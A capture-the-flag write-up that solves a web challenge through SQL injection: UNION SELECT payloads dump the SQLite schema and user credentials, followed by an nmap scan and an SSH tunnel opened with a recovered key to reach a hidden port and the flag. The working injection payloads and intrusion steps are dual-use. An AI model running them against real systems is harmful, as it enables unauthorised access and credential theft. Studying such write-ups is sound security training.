
### Challenge Overview
The challenge involved a web application vulnerable to SQL injection. By exploiting this vulnerability, we were able to extract database information, obtain credentials, and ultimately use SSH tunneling to access a hidden service and retrieve the flag.

### Exploiting SQL Injection
I first identified an SQL injection vulnerability in a parameter. To enumerate the database schema, I used the following payload to extract table names:

```sql
'''''''''''''''''''''''UNION SELECT null,null,null, sql FROM sqlite_schema'
```

This revealed a table named `users`. I then extracted user credentials using:

```sql
'''''''''''''''''''''''UNION SELECT null, null, null, username || '|' || password FROM users'
```

The payload needed to be URL-encoded before injecting it into the vulnerable parameter:

```
%27%27%27%27%27%27%27%27%27%27%27%27%27%27%27%27%27%27%27%27%27%27%27UNION%20SELECT%20null%2C%20null%2C%20null%2C%20username%20%7C%7C%20%27%7C%27%20%7C%7C%20password%20FROM%20users%27
```

One of the extracted passwords hinted at a secret path, which provided access to a `.pem` private key file.

### Scanning for Open Ports
With the credentials , I scanned the target machine for open ports using Nmap:

```
sudo nmap -vv -Pn -sS 20.244.95.158
```

The scan revealed the following open ports:

```
PORT     STATE  SERVICE
21/tcp   open   ftp
22/tcp   open   ssh
80/tcp   closed http
8080/tcp closed http-proxy
```

### Establishing SSH Tunneling
Since port 8080 was closed externally, I used SSH port forwarding to access it locally. Using the obtained `.pem` key, I established an SSH tunnel:

```
ssh -L 9000:0.0.0.0:8080 quandale@20.244.95.158 -i quandale.pem
```

After successfully setting up the tunnel, I accessed `http://localhost:9000` in a web browser, revealing the flag:

```
EH4X{55H_Tunn3linG}
```

